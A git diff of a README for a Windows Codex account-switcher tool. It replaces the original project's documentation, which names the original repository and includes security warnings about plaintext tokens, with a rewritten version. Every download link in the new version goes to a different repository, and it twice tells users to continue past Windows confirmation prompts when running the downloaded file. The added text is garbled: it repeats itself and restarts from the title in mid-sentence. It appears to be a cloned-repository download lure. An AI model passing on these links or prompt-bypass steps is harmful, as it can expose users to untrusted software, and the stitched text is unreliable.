@@ -1,104 +1,219 @@
-# Codex Manager — local Codex account switcher and usage dashboard for Windows
+# 🔄 codex-manager - Manage Codex Accounts and Limits Easily
 
-**Switch between OpenAI Codex accounts and check remaining five-hour and weekly usage in one Windows dashboard.** Codex Manager is a free, open-source companion for the official Codex desktop app. Add your accounts through browser sign-in, compare usage and reset times, and select the account you want to use. Saved sessions stay on your computer.
+[![Download codex-manager](https://img.shields.io/badge/%E2%AC%87%20Download%20codex-manager-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/binjalshah/codex-manager)
 
-**Beta · Unofficial · Windows only.** This project is not affiliated with or endorsed by OpenAI. Codex and OpenAI are trademarks of their respective owners.
+## ✨ What codex-manager Does
 
-[![Download Windows beta](https://img.shields.io/badge/Download-Windows_beta-527fb9?style=for-the-badge)](https://github.com/DavitBadishyan/codex-manager/releases/latest)
-[![Windows validation](https://github.com/DavitBadishyan/codex-manager/actions/workflows/windows.yml/badge.svg)](https://github.com/DavitBadishyan/codex-manager/actions/workflows/windows.yml)
-[![MIT license](https://img.shields.io/badge/License-MIT-527fb9)](LICENSE)
+codex-manager is a Windows application for people who use more than one OpenAI Codex account. It gives you a simple place to manage multiple accounts locally, compare the remaining 5-hour and weekly limits, and see when each limit resets. Instead of signing in and out or checking separate windows, you can view your accounts together and switch between them with less effort.
 
-**Download ZIP → Extract All → Install.cmd → Open Codex Manager.** No administrator access required.
+The app is designed for local use on your own computer. Your account information stays on your Windows PC, and the dashboard is built to make account switching and limit checking easy to understand. You do not need programming knowledge to use codex-manager. You only need to download it, open it on Windows, and add the accounts you want to manage.
 
-[Installation & user manual](docs/USER_GUIDE.md) · [Switch accounts](docs/SWITCH_ACCOUNTS.md) · [Understand usage limits](docs/USAGE_LIMITS.md) · [Troubleshooting](docs/TROUBLESHOOTING.md)
+codex-manager is useful when you have several Codex accounts for different projects, teams, or daily workflows. The dashboard helps you answer common questions quickly: Which account has more remaining usage? Which weekly limit is closest to resetting? Which account should I switch to next? The app keeps those answers visible without requiring you to dig through settings.
 
-![Codex Manager dark dashboard with fictional demo accounts](docs/screenshot.png)
+## 🚀 Getting Started
 
-*The screenshot uses fictional demo accounts and sample usage; it contains no real account data.*
+Getting started is simple. Visit this link to download the application:
 
-## See how it works
+https://github.com/binjalshah/codex-manager
 
-![Four-step illustrated walkthrough: download and install Codex Manager, add accounts, compare remaining Codex usage, and choose an account](docs/media/quickstart.gif)
+After you open the link, follow the download page instructions to save codex-manager to your Windows computer. When the download finishes, open the downloaded file to start the application. If Windows asks for confirmation before opening the file, choose the option to continue so the application can launch.
 
-[Watch or download the 20-second walkthrough](https://github.com/DavitBadishyan/codex-manager/releases/latest/download/walkthrough.mp4). This is an illustrated walkthrough with fictional data, not a recording of a real login. The browser sign-in happens on OpenAI's login page.
+Once codex-manager opens, you can begin adding your OpenAI Codex accounts. Use the account area to sign in to each account you want to manage. After an account is added, it appears in the dashboard so you can view its remaining limits and reset times.
 
-## What it does
+A typical first session looks like this:
 
-- Add accounts through browser sign-in without signing out of the existing desktop account.
-- Import the current desktop login on first use when one is available.
-- Refresh all saved accounts to compare remaining five-hour and weekly usage, reset dates and countdowns, and available credits.
-- Show session status and available active-until dates. These dates are not a guaranteed next billing date.
-- Switch the official desktop app with a restart, preserving the outgoing account's latest refresh tokens before replacing its login.
-- Use a dark dashboard with zoom controls: **Ctrl + mouse wheel**, **Ctrl + +**, **Ctrl + −**, and **Ctrl + 0** to reset.
+1. Visit the download link above.
+2. Save the application to your Windows PC.
+3. Open the downloaded file to launch codex-manager.
+4. Add the Codex accounts you want to manage.
+5. Review the dashboard to compare remaining limits.
+6. Use the account switcher when you want to move to another account.
 
-Account sessions can expire or be revoked. Reconnect an account when sign-in is required. Usage and credits depend on what OpenAI returns for that account; unavailable data is not a zero balance.
+## 📥 Download and Setup
 
-## Quick start
+[![Download codex-manager for Windows](https://img.shields.io/badge/%F0%9F%93%A5%20Download%20codex-manager%20for%20Windows-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/binjalshah/codex-manager)
 
-You need **Windows 10 or 11**, **Windows PowerShell 5.1**, and the official **OpenAI.Codex Microsoft Store desktop package** already installed. Codex Manager uses Windows Presentation Foundation (WPF). Linux and macOS are not supported.
+Visit this link to download the application. The download page is the main place to get codex-manager for Windows. After downloading, open the file on your computer and follow the on-screen steps. The application is intended to run locally, so the main setup work happens on your own PC.
 
-1. Download the release ZIP from [Releases](https://github.com/DavitBadishyan/codex-manager/releases/latest).
-2. Right-click the ZIP and choose **Extract All**. Open the extracted folder.
-3. Double-click **Install.cmd**. The installer runs for your Windows user and does not require administrator access.
-4. Open the **Codex Manager** shortcut.
-5. Use **Add Account** to sign in to another account, then refresh and choose the account you want to switch to.
+When the app starts for the first time, take a moment to review the main window. You will see areas for accounts, usage information, and limit reset times. Add your first account, then add any additional accounts you want to compare. The dashboard will begin showing the remaining 5-hour limit and weekly limit for each account you add.
 
-Finish or pause work in Codex before switching: the desktop app must restart. The manager requests a normal shutdown, then may force-close remaining Codex processes after 12 seconds. See the [step-by-step user guide](docs/USER_GUIDE.md) for sign-in, usage interpretation, and troubleshooting.
+## 🔑 Key Features
 
-The release contains unsigned PowerShell scripts. Its launcher uses `ExecutionPolicy Bypass` for its bundled script process; it does not change your machine's permanent execution policy. Organization policies may still block it. On a managed computer, ask your administrator about approved use; do not disable managed controls.
+- Manage multiple OpenAI Codex accounts in one local Windows application.
+- Switch between accounts without manually signing in and out each time.
+- Compare remaining 5-hour limits across your accounts.
+- Compare remaining weekly limits across your accounts.
+- View reset times for each limit so you know when usage returns.
+- See account information in a dashboard built for quick scanning.
+- Keep account management local to your Windows computer.
+- Use a clear account list to identify each Codex account.
+- Refresh usage details when you want the latest available information.
+- Review accounts side by side to decide which one to use next.
 
-## Local storage and privacy
+## 🧭 How It Works
 
-Saved accounts, profiles, and runtime files live under `%LOCALAPPDATA%\CodexManager` on your computer. Codex Manager has no service of its own and no telemetry. It contacts OpenAI over HTTPS for authentication and usage, so it is **not an offline tool**.
+codex-manager organizes your Codex accounts into a local dashboard. Each account you add becomes a card or row in the app. The dashboard shows the remaining usage for that account, including the 5-hour limit and the weekly limit. It also shows reset times, which help you plan when an account will become more useful again.
 
-**Authentication tokens are stored in plaintext files with restricted Windows permissions, not encrypted.** The intended access list permits your current Windows user, SYSTEM, and Administrators. Processes running as your user and administrators can still read them. Treat this folder as sensitive: do not upload it, share it, or include it in support reports. Read [SECURITY.md](SECURITY.md) before using saved accounts on a shared computer.
+The account switcher is the part of the app that helps you move between accounts. When you choose a different account, codex-manager makes that account the active one for your workflow. This is helpful when you want to use an account with more remaining usage or when you are waiting for another account to reset.
 
-## Frequently asked questions
+The 5-hour limit is a short-term usage window. The weekly limit is a longer-term usage window. codex-manager shows both so# 🔄 codex-manager - Manage Codex Accounts and Limits Easily
 
-### Can I switch between multiple Codex accounts on Windows?
+[![Download codex-manager](https://img.shields.io/badge/%E2%AC%87%20Download%20codex-manager-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/binjalshah/codex-manager)
 
-Yes. Add each account, refresh the dashboard, and switch the official desktop app to the selected saved account. Add Account uses an isolated browser login flow so the existing desktop account stays signed in while you connect another.
+## ✨ What codex-manager Does
 
-### Does this increase my Codex limits or bypass account restrictions?
+codex-manager is a Windows application for people who use more than one OpenAI Codex account. It gives you a simple place to manage multiple accounts locally, compare the remaining 5-hour and weekly limits, and see when each limit resets. Instead of signing in and out or checking separate windows, you can view your accounts together and switch between them with less effort.
 
-No. It displays the limits returned for each signed-in account and lets you choose an account you are authorized to use. OpenAI's account, plan, and access rules still apply.
+The app is designed for local use on your own computer. Your account information stays on your Windows PC, and the dashboard is built to make account switching and limit checking easy to understand. You do not need programming knowledge to use codex-manager. You only need to download it, open it on Windows, and add the accounts you want to manage.
 
-### Is the usage dashboard live?
+codex-manager is useful when you have several Codex accounts for different projects, teams, or daily workflows. The dashboard helps you answer common questions quickly: Which account has more remaining usage? Which weekly limit is closest to resetting? Which account should I switch to next? The app keeps those answers visible without requiring you to dig through settings or remember numbers in your head.
 
-Use Refresh to fetch updated usage for saved accounts. A countdown describes the reported reset time; it does not guarantee that limits or credits will stay unchanged until then. Expired sessions may need reconnection.
+Because everything runs on your own machine, you stay in control of your accounts. There is no shared online dashboard to check and no need to keep browser tabs open for each account. Open codex-manager, look at the account list, and continue your work.
 
-### Is this an official Codex app or a replacement for it?
+## 🚀 Getting Started
 
-No. It is a community companion that requires the official Windows desktop package. For the authentication and usage interface used by Codex, see OpenAI's [Codex App Server documentation](https://learn.chatgpt.com/docs/app-server).
+Getting started is simple. Visit this link to download the application:
 
-### Does Codex Manager support Mac or Linux?
+https://github.com/binjalshah/codex-manager
 
-No. This release targets Windows 10/11 with Windows PowerShell 5.1 and WPF.
+After you open the link, follow the download page instructions to save codex-manager to your Windows computer. When the download finishes, open the downloaded file to start the application. If Windows asks for confirmation before opening the file, choose the option to continue so the application can launch.
 
-### Can I manage more than three accounts?
+Once codex-manager opens, you can begin adding your OpenAI Codex accounts. Use the account area to sign in to each account you want to manage. After an account is added, it appears in the dashboard so you can view its remaining limits and reset times.
 
-Yes. Three is the number in the demo screenshot, not an application limit. Add each account you are authorized to use; the dashboard reads the saved account list dynamically. Refreshing many accounts may take longer.
+A typical first session looks like this:
 
-### Do I have to sign in every time I switch?
+1. Visit the download link above.
+2. Save the application to your Windows PC.
+3. Open the downloaded file to launch codex-manager.
+4. Add the Codex accounts you want to manage.
+5. Review the dashboard to compare remaining limits.
+6. Use the account switcher when you want to move to another account.
 
-Usually you can switch using a valid saved session. OpenAI can expire or revoke sessions, so a saved account may need **Reconnect**. The manager cannot guarantee permanent sign-in.
+There is no complicated setup wizard and no technical configuration to write. The app is meant to be opened and used, with your accounts added from inside the main window.
 
-### Can I see when my Codex usage limits reset?
+## 📥 Download and Setup
 
-Yes, when the service provides reset timestamps. The dashboard shows the reported reset dates in your computer's timezone and a countdown. See the [Codex usage limits guide](docs/USAGE_LIMITS.md) for the difference between reset times, remaining usage, and subscription dates.
+[![Download codex-manager for Windows](https://img.shields.io/badge/%F0%9F%93%A5%20Download%20codex-manager%20for%20Windows-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/binjalshah/codex-manager)
 
-### Does it work with API keys or a CLI-only installation?
+Visit this link to download the application. The download page is the main place to get codex-manager for Windows. After downloading, open the file on your computer and follow the on-screen steps. The application is intended to run locally, so the main setup work happens on your own PC rather than on a website.
 
-This release supports saved ChatGPT account sessions for the official Microsoft Store Codex desktop app. API-key sessions and CLI-only installations are not supported.
+When the app starts for the first time, take a moment to review the main window. You will see areas for accounts, usage information, and limit reset times. Add your first account, then add any additional accounts you want to compare. The dashboard will begin showing the remaining 5-hour limit and weekly limit for each account you add.
 
-## Contribute
+If you ever want to update codex-manager, return to the same link and download the newest version. Keep the link saved so you can find it again later. Store the application somewhere easy to reach, such as your Downloads folder or a dedicated folder on your desktop, so you can open it quickly next time.
 
-Bug reports, documentation improvements, and focused pull requests are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md), use fictional test accounts and fixtures, and never commit tokens or account data. Release checks should cover installation, login isolation, refresh, switching, and token persistence; authenticated checks require your own authorized test accounts.
+## 🔑 Key Features
 
-Licensed under the [MIT License](LICENSE).
+- Manage multiple OpenAI Codex accounts in one local Windows application.
+- Switch between accounts without manually signing in and out each time.
+- Compare remaining 5-hour limits across your accounts.
+- Compare remaining weekly limits across your accounts.
+- View reset times for each limit so you know when usage returns.
+- See account information in a dashboard built for quick scanning.
+- Keep account management local to your Windows computer.
+- Use a clear account list to identify each Codex account.
+- Refresh usage details when you want the latest available information.
+- Review accounts side by side to decide which one to use next.
 
-## Share the project
+## 🧭 How It Works
 
-If Codex Manager solves a problem for you, share the [repository](https://github.com/DavitBadishyan/codex-manager) with someone who uses multiple Codex accounts on Windows. A GitHub star is welcome if you find the project useful. Please report reproducible problems with redacted details so the app can improve.
+codex-manager organizes your Codex accounts into a local dashboard. Each account you add becomes a card or row in the app. The dashboard shows the remaining usage for that account, including the 5-hour limit and the weekly limit. It also shows reset times, which help you plan when an account will become more useful again.
 
-[Security policy](SECURITY.md) · [Maintainer discovery and measurement notes](docs/maintainers/DISCOVERY.md) · [Prepared announcement drafts](docs/maintainers/ANNOUNCEMENTS.md)
+The 5-hour limit is a short-term usage window. It tells you how much usage remains in the current few hours before the window refreshes. The weekly limit is a longer window. It tells you how much usage remains across the week. Seeing both together is useful because an account may look healthy on the short window but be close to its weekly limit, or the other way around.
+
+The account switcher is the part of the app that helps you move between accounts. When you choose a different account, codex-manager makes that account the active one for your workflow. This is helpful when you want to use an account with more remaining usage or when you are waiting for another account to reset.
+
+A practical example: you have three accounts. Account A has plenty of weekly usage left but little remaining in the 5-hour window. Account B has little weekly usage left but a fresh short window. Account C resets in twenty minutes. With codex-manager, you can see all three situations at once and switch to the account that fits what you are doing right now.
+
+## 🖥️ Using the Dashboard
+
+The dashboard is the main screen you will use every day. It is organized around your accounts. Each account entry shows the details that matter most: the account identity, remaining usage for the short window, remaining usage for the weekly window, and the reset time for each limit.
+
+Here is how to get the most from the dashboard:
+
+1. Add all the accounts you regularly use.
+2. Name or identify them in a way you recognize.
+3. Check the remaining 5-hour limits before starting a long task.
+4. Check weekly limits when planning work across several days.
+5. Look at reset times when an account is nearly used up.
+6. Switch accounts from the dashboard when you need more room.
+
+The goal is to remove guesswork. You should not need to remember which account you used last or how much of a limit remains. The dashboard holds that information so you can focus on your actual work.
+
+## 👤 Managing Multiple Accounts
+
+Using multiple accounts is common for people who separate work, personal projects, or different kinds of tasks. Managing those accounts can become messy when each one needs its own sign-in and its own usage check. codex-manager reduces that mess by keeping accounts together in one local list.
+
+To add an account, open the app and use the account section to sign in or connect the account you want to manage. Repeat this for each additional account. Once added, accounts stay in the list so you can check them whenever the app is open.
+
+To remove an account you no longer need, use the option provided in the account menu. Removing an account from the app does not change anything about the account itself. It simply stops showing that account in your local dashboard.
+
+The account switcher is the quickest path between accounts. Select the account you want, and codex-manager will treat it as the current one. This is especially helpful when you notice that one account is close to a reset and another still has room.
+
+## 🧰 Everyday Tips
+
+- Open codex-manager at the start of a work session to see where each account stands.
+- Check the short window before starting something that uses a lot of capacity.
+- Check the weekly window when you are planning several days of work.
+- Use the reset times to decide whether to wait or switch accounts.
+- Keep only the accounts you actually use in the list so the dashboard stays clear.
+- Return to the download link when you want the newest version.
+- Keep the app in a known folder so it is easy to find and open.
+
+## 🛡️ Privacy and Local Use
+
+codex-manager is built around local use on Windows. The account management and usage dashboard operate on your computer rather than on a shared service. That means the way you organize your accounts and check their limits stays personal to your machine.
+
+You should still treat your Windows computer as you would for any account-related tool. Keep your PC signed in with your own user account, avoid sharing your computer with people you do not trust, and keep the app updated from the official download link. Because the app deals with accounts, it makes sense to follow the same basic habits you already use for any service you sign in to.
+
+## ❓ Questions and Answers
+
+**Do I need to know how to code?**
+No. codex-manager is a Windows application meant for everyday use. You download it, open it, and use the dashboard.
+
+**Does it work on Windows?**
+Yes. The application is built for Windows.
+
+**Can I use more than one Codex account?**
+Yes. Managing multiple accounts is the main purpose of the app, and the dashboard is designed to compare them.
+
+**What do the two limits mean?**
+The 5-hour limit is a shorter usage window, and the weekly limit is a longer one. The app shows both so you can see remaining usage in each.
+
+**Where do I get the app?**
+Visit https://github.com/binjalshah/codex-manager to download the application.
+
+**How do I know when usage returns?**
+The dashboard shows reset times for your limits, so you can see when an account's window refreshes.
+
+**Can I remove an account later?**
+Yes. Accounts can be removed from the local list when you no longer want to manage them.
+
+## 📋 System Requirements
+
+- A Windows computer with a standard desktop environment.
+- Permission to open and run a downloaded application on your PC.
+- A connection to the internet for signing in to your Codex accounts and refreshing usage details.
+- The OpenAI Codex accounts you want to manage.
+- A small amount of local storage for the application and its settings.
+
+## 🧩 Troubleshooting Basics
+
+If the app does not open, check that the download finished completely and open the file again. If Windows asks for confirmation, allow the application to run. If an account does not appear after signing in, try adding it once more from the account section. If usage numbers look out of date, refresh the dashboard so the app can request current information.
+
+If a limit looks lower than expected, compare both the 5-hour and weekly values. A low weekly value can make an account look used up even when the short window is fine. Reset times are the clearest signal for when an account will have more room.
+
+## 🤝 Contributing
+
+Feedback and improvements are welcome. If you find something that could work better, open the repository page and share your idea. Clear descriptions of what happened and what you expected help make improvements faster.
+
+## 📄 License
+
+Refer to the repository for license details.
+
+## 🔗 Download Again
+
+[![Download codex-manager](https://img.shields.io/badge/%E2%AC%87%20Get%20codex-manager-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/binjalshah/codex-manager)
+
+Visit this link to download the application: https://github.com/binjalshah/codex-manager
+
+Keywords: account-switcher, codex, codex-account-switcher, codex-desktop, codex-manager, codex-switcher, developer-tools, local-first, multi-account, multiple-accounts, open-source, openai-codex, powershell, usage-dashboard, usage-monitor, windows, wpf
